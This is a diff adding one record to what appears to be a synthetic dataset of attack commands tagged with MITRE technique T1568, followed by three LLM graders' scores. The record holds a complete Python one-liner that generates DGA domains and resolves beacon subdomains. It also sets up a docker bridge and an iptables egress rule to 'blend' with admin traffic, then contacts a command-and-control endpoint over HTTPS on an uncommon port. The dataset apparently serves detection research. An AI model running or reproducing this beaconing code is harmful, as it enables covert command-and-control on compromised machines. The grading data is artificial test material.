@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='dock-key'; tlds=['net','com']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.sha1((base+str(i)).encode()).hexdigest()[:9]+'.'+tlds[i%len(tlds)] for i in range(n)]\n# Prepare a stealthy isolated bridge network (admin action) to blend traffic\ntry:\n    subprocess.run(['docker','network','create','--driver','bridge','--subnet','172.28.0.0/24','c2_br'],timeout=5)\nexcept Exception:\n    pass\nip=None; dom=None; port=random.choice([10443,25000,18088])\nfor d in dga(20):\n    resp=sr1(IP(dst='9.9.9.9')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname='beacon.'+d,qtype='A')),timeout=3,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for a in resp[DNS].an:\n            if getattr(a,'type',0)==1:\n                ip=a.rdata; dom='beacon.'+d; break\n    if ip: break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','-A','Mozilla/5.0',f'https://{dom}:{port}/probe','-k'])\n    print(dom,ip,port)\"",
+  "explanation": "Creates an isolated docker bridge to blend with admin activity, resolves a DGA subdomain, and opens a narrow egress path to a high, uncommon port for C2.",
+  "rationale_steps": [
+    "Establish a docker bridge network to hide within legitimate admin operations.",
+    "Generate DGA subdomains and resolve with scapy to obtain an A record.",
+    "Insert a restrictive iptables egress rule for the selected IP and port.",
+    "Perform a TLS probe on a nonstandard port to avoid signature-based detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-f15d3f92",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is well-formed with properly balanced parentheses, quotes, and correct syntax for imports, function definitions, exception handling, and subprocess calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by creating a DGA algorithm based on current date, attempting DNS resolution of generated domains, establishing a covert network path via Docker bridge and iptables rules, and initiating C2 communication over HTTPS to the resolved endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:33:41.128745Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with correct syntax, balanced quotes, valid function calls, and proper control flow.",
+        "semantic_score": 3,
+        "semantic_justification": "While the DGA generation and resolution components are semantically aligned with T1568, the critical 'iptables' rule modification and 'docker network create' calls require elevated privileges (root/docker group) which directly contradicts the stated 'Privilege: None', making key parts of the claimed intent operationally implausible.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:33:53.775406Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The python3 -c string is well-formed with balanced quotes, valid Python syntax, and correct argument formatting.",
+        "semantic_score": 3,
+        "semantic_justification": "It implements a DGA and performs DNS queries then beacons to a resolved domain (matching T1568), but operationally depends on scapy raw sockets, docker, and iptables which typically require root and contradict the stated Privilege: None.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T06:34:19.024799Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
